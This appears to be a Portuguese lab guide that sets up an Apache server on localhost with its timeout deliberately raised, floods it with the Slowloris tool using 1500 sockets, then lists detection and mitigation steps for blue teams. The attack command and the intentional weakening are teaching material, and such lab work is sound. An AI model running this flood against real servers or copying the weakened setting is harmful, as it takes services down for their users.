🔧 1. PREPARAÇÃO DO AMBIENTE (ALVO)

1

Atualizar o sistema e instalar o Apache

sudo apt update

sudo apt install apache2 -y

Instala o servidor web Apache e confirma a instalação.

2

Criar página de teste e Reiniciar

echo "

Bem-vindo ao Lab DoS

" | sudo tee /var/www/html/index.html

sudo systemctl restart apache2

Cria o alvo e garante que o Apache está ativo.

Aumentar Timeout (Para Simular Vulnerabilidade)

3

Aumentar o Timeout do Apache para 700 segundos

sudo nano /etc/apache2/apache2.conf

// Localize e altere:

Timeout 300

Timeout 700

Permite que o Slowloris mantenha conexões inativas por mais tempo, aumentando a eficácia do ataque.

4

Reiniciar e Verificar o Apache

sudo systemctl restart apache2

sudo systemctl status apache2

💣 2. SIMULAÇÃO DO ATAQUE DoS COM SLOWLORIS

7

Instalar e Executar o Ataque

sudo apt install slowloris -y

8

Executar o ataque com 1500 sockets

slowloris localhost -p 80 -s 1500 -v

  • -s 1500: 1500 sockets simultâneos, agressivo.
  • -v: Modo verboso, exibe detalhes em tempo real.
9

Encerrar o Ataque

Pressione Ctrl+C no terminal do Slowloris.

Monitoramento e Verificação

9

Monitorar Conexões em Outro Terminal

sudo netstat -anp | grep :80

// Para monitoramento contínuo (atualiza a cada 1s):

watch -n 1 "netstat -anp | grep :80"

10

Testar Disponibilidade (Downtime)

Acesse novamente http://localhost. Se o ataque for bem-sucedido, a página deve falhar ou demorar para carregar (Erro 503 Service Unavailable).

12

Restauração Final

Restaurar o Timeout original (300) e reiniciar o Apache.

🛡️ 3. VISÃO GERAL E MITIGAÇÃO (BLUE TEAM)

Visão Geral e Características

O Slowloris é um ataque de negação de serviço (DoS) de **baixo tráfego** que visa esgotar os recursos de conexão do servidor. Ele mantém conexões abertas enviando cabeçalhos HTTP incompletos em intervalos lentos.

  • Silencioso: Difícil de detectar por volume.
  • Exaustão: Ocupa slots de conexão do servidor.
  • Eficácia: Alta contra servidores com `Timeout` alto.

Correções e Medidas de Mitigação

  • Timeout Baixo: Reduzir o `Timeout` para 5-10 segundos.
  • Rate Limiting: Usar Nginx ou HAProxy para limitar requisições por IP.
  • Módulos Apache: Usar mod_reqtimeout ou mod_evasive.
  • WAF: Implementar um Web Application Firewall (ModSecurity).
  • KeepAlive: Manter o KeepAliveTimeout baixo.

🧠 5. ANÁLISE POR PERFIL (RED TEAM vs. BLUE TEAM)

🔴 Pentester (Red Team)

O Slowloris é uma ferramenta útil para testar a resiliência de servidores web contra ataques de exaustão de conexões, simulando um cliente malicioso com requisições lentas e incompletas.

Em um teste de intrusão, o pentester avalia:

  • Limites de conexão por IP do servidor.
  • Presença de Timeouts agressivos para conexões lentas.
  • Existência de proteções como WAF, mod_evasive ou Reverse Proxies.

Resumo Prático:

Usa o Slowloris para causar lentidão/falha (erro 503) e documenta as vulnerabilidades de mitigação.

🔵 SOC Analyst (Blue Team)

Por ser um ataque silencioso e de baixa taxa, o Slowloris dificulta a detecção por sistemas baseados em volume de tráfego, exigindo monitoramento comportamental.

O analista deve monitorar:

  • Picos de uso de sockets sem aumento proporcional de tráfego.
  • Conexões persistentes e incompletas nas portas 80/443.
  • Padrões de cabeçalhos HTTP incompletos.

A Resposta envolve:

  • Bloqueio de IPs ofensores (Contenção).
  • Ajuste de configurações no servidor (Timeout, KeepAlive).
  • Aplicação de Rate Limiting e Timeouts agressivos (Erradicação).
